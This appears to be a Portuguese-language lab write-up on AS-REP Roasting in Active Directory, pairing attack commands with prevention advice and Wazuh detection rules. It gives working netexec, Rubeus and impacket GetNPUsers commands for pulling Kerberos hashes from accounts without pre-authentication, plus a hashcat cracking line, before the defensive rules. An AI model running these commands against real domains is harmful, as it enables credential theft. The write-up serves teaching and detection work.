### Descrição
O ataque AS-REProasting é semelhante ao ataque Kerberoasting; podemos obter hashes quebráveis para contas de usuário que têm a propriedade Não exigir pré-autenticação Kerberos ativada. O sucesso desse ataque depende da força da senha da conta de usuário que vamos quebrar.
<img width="1334" height="790" alt="conf" src="https://github.com/user-attachments/assets/e5e3e10d-7c78-46cf-9c6f-c0d43328f5b6" />


### Attack

Com netexec
```nxc ldap 192.168.3.143 -u users.txt '' --asreproast hashes.txt ```

Com Rubeus desde terminal powershell
```PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast```
<img width="1008" height="849" alt="asrep1" src="https://github.com/user-attachments/assets/bccb839d-591f-4b1b-8d9f-defdffe7aa0c" />


Com impacket desde linux
```python3 /opt/impacket-0.13.0/examples/GetNPUsers.py 'Marvel.local/user:pass' -dc-ip 192.123.3.43```
<img width="1389" height="193" alt="ver" src="https://github.com/user-attachments/assets/23724829-e385-4099-8b87-4afb95f0811c" />


```python3 /opt/impacket-0.13.0/examples/GetNPUsers.py 'Marvel.local/' -usersfile usuarios.txt -dc-ip 192.168.0.40 -no-pass```
<img width="1745" height="339" alt="asrimpacket" src="https://github.com/user-attachments/assets/1bdb7cd6-8890-4209-b284-541b36282c96" />


Cracking com hashcat
```hashcat -a 0 -m 18200 -a 0 asrep.txt rockyou.txt --force -O```

### Prevencao
Senhas fortes
Configuracao do Tipo de Pré-Autenticação, que contém informações relacionadas ao tipo de solicitação. Ferramentas que aproveitam a opção “Não exigir pré-autenticação Kerberos” em uma conta de usuário de domínio geram o tipo 0 no evento relacionado ao logon sem Pré-Autenticação. 

### Wazuh rules e log

No wazuh manager, no arquivo /var/ossec/etc/rules/local_rules.xml colar o seguinte codigo para detecao de 
```
<group name="security_event,windows">
    <!-- KERBEROASTING (T1558.003) -->
    <rule id="110002" level="12">
        <if_sid>60103</if_sid>
        <field name="win.system.eventID">^4769$</field>
        <!-- Ticket Encryption Type RC4 (0x17) = Kerberoasting -->
        <field name="win.eventdata.TicketEncryptionType" type="pcre2">0x17</field>
        <!-- Target NO debe terminar en $ (no es cuenta de máquina) -->
        <field name="win.eventdata.TargetUserName" type="pcre2">^[^$]+$</field>
        <!-- TicketOptions flexible para Rubeus/Impacket -->
        <field name="win.eventdata.TicketOptions" type="pcre2">0x40810000|0x40810010</field>
        <options>no_full_log</options>
        <description>Possible Kerberoasting attack from $(win.eventdata.IpAddress) for service $(win.eventdata.ServiceName)</description>
        <mitre>
            <id>T1558.003</id>
        </mitre>
    </rule>


    <!-- AS-REP ROASTING (T1558.004) - NUEVA -->
    <rule id="110004" level="12">
        <if_sid>60103</if_sid>
        <field name="win.system.eventID">^4768$</field>
        <!-- PreAuthType 0 = sin preautenticación -->
        <field name="win.eventdata.PreAuthType" type="pcre2">0</field>
        <options>no_full_log</options>
        <description>Possible AS-REP Roasting attack for account $(win.eventdata.TargetUserName)</description>
        <mitre>
            <id>T1558.004</id>
        </mitre>
    </rule>
</group>
```

<img width="1853" height="929" alt="wzroasting" src="https://github.com/user-attachments/assets/9bf7fcdc-c2ae-4c35-b3b8-c308b0e56744" />

